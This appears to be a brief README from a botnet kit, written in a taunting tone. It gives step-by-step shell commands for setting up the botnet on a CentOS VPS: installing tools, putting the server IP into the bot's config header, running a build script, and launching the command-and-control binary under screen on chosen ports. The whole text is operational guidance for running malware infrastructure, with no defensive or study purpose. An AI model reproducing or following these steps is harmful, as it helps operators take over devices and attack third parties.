this botnet is the most simple botnet to setup,
if you cant do it i swear to god.

Suggested OS; CentOS (Any version of your choosing)

Make sure every file is uploaded to your server.

Setup:
yum install python wget nano -y
nano bot/headers/config.h
(Put your VPS/Server IP in there and use ctrl + x to exit)
python cc7.py 127.0.0.1 (replace 127.0.0.1 with your vps IP)

then find the executable cnc file and execute it like this
(its probably in /root/ or /root/cnc you can enter those directories
by doing cd /root/ or cd /root/cnc/)

then give it exec perms by doing:
chmod +x cnc

then screen it by doing:
screen ./cnc 911 700 [a port of your choosing]
